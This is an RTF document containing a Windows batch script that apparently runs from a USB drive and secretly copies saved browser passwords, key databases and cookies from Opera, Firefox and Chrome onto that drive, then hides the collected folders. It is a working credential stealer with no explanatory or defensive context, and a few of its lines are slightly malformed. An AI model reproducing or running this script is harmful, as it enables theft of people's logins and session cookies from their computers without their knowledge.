{\rtf1\ansi\ansicpg1251\cocoartf1561\cocoasubrtf400
{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;\red14\green14\blue14;\red255\green255\blue255;}
{\*\expandedcolortbl;;\cssrgb\c6667\c6667\c6667;\cssrgb\c100000\c100000\c100000;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0

\f0\fs28 \cf2 \cb3 \expnd0\expndtw0\kerning0
@echo off\
md %~d0\\Mozilla\
md %~d0\\Opera\
md %~d0\\Google\
CD/D %APPDATA%\\Opera\\Opera\\\
copy /y wand.dat %~d0\\Opera\\\
copy /y cookies.dat %~d0\\Opera\\\
cd %AppData%\\Mozilla\\Firefox\\Profiles\\*.def\'adault\
copy /y cookies.sqlite %~d0\\Mozilla\
copy /y key3.db %~d0\\Mozilla\
copy /y signons.sqlite %~d0\\Mozilla\
copy /y AppData%\\Mozilla\\Firefox\\Profiles\\*.defa\'adult %~d0\\Mozilla\
cd %localappdata%\\Google\\Chrome\\User Data\\Default\
copy /y "%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data" "%~d0\\Google"\
ATTRIB -R -A -S -H\
attrib +h %~d0\\Mozilla\
attrib +h %~d0\\Opera\
attrib +h %~d0\\Google\
attrib +h %~d0\\Yandex\
del: autorun.inf\uc0\u65279 }